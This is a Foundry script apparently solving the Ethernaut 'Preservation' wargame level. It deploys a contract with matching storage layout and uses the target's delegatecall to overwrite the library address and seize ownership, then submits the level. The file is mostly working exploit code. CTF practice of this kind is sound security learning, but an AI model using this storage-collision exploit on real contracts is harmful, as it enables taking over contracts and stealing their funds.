// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Preservation} from "src/16/Preservation.sol";
import {PreservationFactory} from "src/16/PreservationFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract PreservationExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL16_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new PreservationFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        Exploit exploit = new Exploit();
        Preservation(instance).setSecondTime(uint256(uint160(address(exploit))));
        Preservation(instance).setFirstTime(uint256(uint160(vm.addr(deployerKey)))); 

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    address freeSlot1;
    address freeSlot2;

    address owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
